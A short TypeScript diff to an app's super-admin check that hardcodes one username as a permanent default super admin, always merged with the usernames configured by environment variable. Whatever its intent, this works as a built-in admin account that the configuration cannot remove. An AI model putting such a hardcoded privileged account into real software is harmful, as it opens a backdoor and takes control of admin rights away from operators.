@@ -13,7 +13,12 @@ const parseCsvSet = (value: string | undefined, normalize = (entry: string) => e
             .filter(Boolean)
     );
 
-const getSuperAdminUsernames = () => parseCsvSet(process.env.SUPER_ADMIN_USERNAMES, (entry) => entry.toLowerCase());
+const DEFAULT_SUPER_ADMIN_USERNAMES = new Set(["human_ikzcsvsb"]);
+
+const getSuperAdminUsernames = () => {
+    const configured = parseCsvSet(process.env.SUPER_ADMIN_USERNAMES, (entry) => entry.toLowerCase());
+    return new Set(Array.from(DEFAULT_SUPER_ADMIN_USERNAMES).concat(Array.from(configured)));
+};
 const getSuperAdminClerkIds = () => parseCsvSet(process.env.SUPER_ADMIN_CLERK_IDS);
 
 export const isSuperAdminIdentity = ({ username, clerkId }: SuperAdminIdentity) => {
